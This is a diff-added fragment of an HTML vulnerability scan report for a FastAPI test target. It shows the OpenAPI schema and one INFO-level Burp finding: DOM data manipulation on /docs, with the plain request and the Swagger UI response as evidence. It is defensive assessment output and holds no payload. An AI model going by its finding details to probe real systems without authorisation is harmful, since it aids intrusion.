+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/jobs&quot;:{&quot;post&quot;:{&quot;summary&quot;:&quot;Jobs&quot;,&quot;operationId&quot;:&quot;jobs_jobs_post&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Read Root&quot;,&quot;operationId&quot;:&quot;read_root__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}}}}}</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 6. [burp] DOM data manipulation (DOM-based)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application may be vulnerable to DOM-based DOM data manipulation. Data is read from &lt;b&gt;location.hash&lt;/b&gt; and passed to &lt;b&gt;history.pushState&lt;/b&gt;. (confidence: FIRM) @ http://target.local:8000/docs</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdygyg-2g</code> — <code>artifacts/_/ev-mqxdygyg-2g/</code></div><div class="lbl">REQUEST</div><pre>GET /docs HTTP/1.1
+Host: target.local:8000
+
+GET /docs HTTP/1.1
+Host: target.local:8000
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+date: Sun, 28 Jun 2026 06:02:26 GMT
+server: uvicorn
+content-length: 931
+content-type: text/html; charset=utf-8
+
+
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://fastapi.tiangolo.com/img/favicon.png&quot;&gt;
+    &lt;title&gt;FastAPI - Swagger UI&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;div id=&quot;swagger-ui&quot;&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js&quot;&gt;&lt;/script&gt;
+    &lt;!-- `SwaggerUIBundle` is now available on the page --&gt;
+    &lt;script&gt;
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    &quot;dom_id&quot;: &quot;#swagger-ui&quot;,
+&quot;layout&quot;: &quot;BaseLayout&quot;,
+&quot;deepLinking&quot;: true,
+&quot;showExtensions&quot;: true,
+&quot;showCommonExtensions&quot;: true,
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+</body></html>
